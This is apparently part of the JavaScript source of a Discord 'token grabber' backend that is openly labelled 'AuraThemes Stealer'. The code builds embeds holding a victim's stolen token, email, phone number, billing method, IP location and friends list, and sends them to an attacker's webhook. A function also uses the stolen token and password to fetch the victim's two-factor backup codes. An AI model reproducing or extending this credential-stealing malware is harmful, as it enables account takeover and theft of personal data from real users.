        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)

})

function getInfo(url, token) {
    var data;
    const res = request("GET", url, {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    })
    if (res.statusCode !== 200) data = "Invalid"
    else data = JSON.parse(res.getBody())
    return data
}

function getMFACode(token, password) {
    var what;
    const res = request("POST", "https://discord.com/api/v9/users/@me/mfa/codes", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        },
        body: JSON.stringify({
            password: password,
            regenerate: false
        })
    })
    var data = JSON.parse(res.getBody())
    data.backup_codes.forEach(a => null == a.consumed && (what += `${a.code} | `));
    return what.slice(9, -2)
}

function getIPInfo(ip) {
    var data;
    var res = request("GET", `http://ip-api.com/json/${ip}`)
    data = JSON.parse(res.getBody())
    return data
}

function badges(f) {
    var b = "";
    if ((f & 1) == 1) b += "<:staff:869411643765964921>";
    if ((f & 2) == 2) b += "<:S_badgePartnerIDK:853638010737786910>";
    if ((f & 4) == 4) b += "<:Hypesquadevents:894192746569535568>"
    if ((f & 8) == 8) b += "<:DE_BadgeBughunter:918945699503145011>";
    if ((f & 64) == 64) b += "<:bravery:889966063100493914>";
    if ((f & 128) == 128) b += "<:brilliance:889966063377317908>";
    if ((f & 256) == 256) b += "<:balance:889966062962094090>";
    if ((f & 512) == 512) b += "<:lgn_earlysupporter:905293948665360384>";
    if ((f & 16384) == 16384) b += "<:DE_BadgeBughunterCanary:918945729400147978>";
    if ((f & 131072) == 131072) b += "<:dev_bot:904823639537504286>";
    if ((f & 4194304) == 4194304) b += "<:activedev:1041634224253444146>";
    if (b == "") b = "<:xmark:1120542742020366427>"
    return b
}

function friendBadges(f) {
    var b = "";
    if ((f & 1) == 1) b += "<:staff:869411643765964921>";
    if ((f & 2) == 2) b += "<:S_badgePartnerIDK:853638010737786910>";
    if ((f & 4) == 4) b += "<:Hypesquadevents:894192746569535568>"
    if ((f & 8) == 8) b += "<:DE_BadgeBughunter:918945699503145011>";
    if ((f & 512) == 512) b += "<:lgn_earlysupporter:905293948665360384>";
    if ((f & 16384) == 16384) b += "<:DE_BadgeBughunterCanary:918945729400147978>";
    if ((f & 131072) == 131072) b += "<:dev_bot:904823639537504286>";
    if ((f & 4194304) == 4194304) b += "<:activedev:1041634224253444146>";
    if (b == "") b = "<:xmark:1120542742020366427>"
    return b
}

function getNitro(oof) {
    var n = ""
    if ((oof & 0) == 0) n = "<:Nitro_Yohann:901289849024282674> <:xmark:1120542742020366427>"
    if ((oof & 1) == 1) n = "<:Nitro_Yohann:901289849024282674>"
    if ((oof & 2) == 2) n = "<:LNnitro:918956604987166760> <:6_boost:854202388084293642>"
    if (n == "") n = "<:Nitro_Yohann:901289849024282674> <:xmark:1120542742020366427>"
    return n
}


function friendInfos(friends) {
    var returned;
    var friendFilter = friends.filter(r => r.type == 1)
    for (filter of friendFilter) {
        var badges = friendBadges(filter.user.public_flags)
        if (badges != "None") returned += `${badges} ${filter.user.username}#${filter.user.discriminator}\n`
    }
    if (!returned) returned = "<a:alertNew:1120542692569522308> Sus amigos no tienen insignias raras"
    if (returned == "<a:alertNew:1120542692569522308> Sus amigos no tienen insignias raras") return returned
    else return returned.slice(9)
}

app.listen(port, () => {
    console.log(`server in port: ${port}`);
});